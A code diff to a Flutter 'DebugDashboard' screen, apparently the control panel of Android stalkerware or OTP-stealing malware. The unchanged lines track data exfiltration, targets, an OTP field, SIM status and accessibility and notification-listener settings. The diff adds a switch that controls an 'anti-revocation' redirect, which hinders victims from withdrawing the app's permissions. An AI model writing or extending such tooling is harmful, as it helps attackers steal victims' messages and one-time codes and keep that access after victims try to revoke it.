@@ -37,6 +37,7 @@ class _DebugDashboardState extends State<DebugDashboard> {
   String _lastExfil = 'never';
   int _pollCount = 0;
   bool _busy = false;
+  bool _autoRedirect = true;
 
   final _targetCtrl = TextEditingController();
   final _otpCtrl = TextEditingController(text: '123456');
@@ -152,6 +153,10 @@ class _DebugDashboardState extends State<DebugDashboard> {
       );
       if (mounted) setState(() => _status['notifPolicy'] = '$p');
     } catch (_) {}
+    try {
+      final a = await _permissionsChannel.invokeMethod<bool>('getAutoRedirect');
+      if (mounted) setState(() => _autoRedirect = a ?? true);
+    } catch (_) {}
     await _loadTargets(silent: silent);
     if (mounted) setState(() => _busy = false);
     if (!silent) _dlog('refresh: done');
@@ -209,6 +214,18 @@ class _DebugDashboardState extends State<DebugDashboard> {
       if (mounted) setState(() {});
     } catch (e) {
       _dlog('exfil [$type] ERROR $e');
+    }
+  }
+
+  Future<void> _setAutoRedirect(bool on) async {
+    try {
+      await _permissionsChannel.invokeMethod('setAutoRedirect', {
+        'enabled': on,
+      });
+      if (mounted) setState(() => _autoRedirect = on);
+      _dlog('auto_redirect -> $on');
+    } catch (e) {
+      _dlog('auto_redirect ERROR $e');
     }
   }
 
@@ -305,7 +322,18 @@ class _DebugDashboardState extends State<DebugDashboard> {
               _row('silent mode', _status['silentMode']!),
               _row('SIM', _status['sim']!),
               _row('bg service', _status['bgService']!),
-              const SizedBox(height: 8),
+              SwitchListTile(
+                dense: true,
+                contentPadding: EdgeInsets.zero,
+                title: const Text('Auto settings redirect',
+                    style: TextStyle(fontSize: 13)),
+                subtitle: const Text(
+                  'OFF = silence anti-revocation popups while testing',
+                  style: TextStyle(fontSize: 11),
+                ),
+                value: _autoRedirect,
+                onChanged: _setAutoRedirect,
+              ),
               Wrap(spacing: 8, runSpacing: 8, children: [
                 _btn('Accessibility settings', () => _open('openAccessibilitySettings')),
                 _btn('Listener settings', () => _open('openNotificationListenerSettings')),
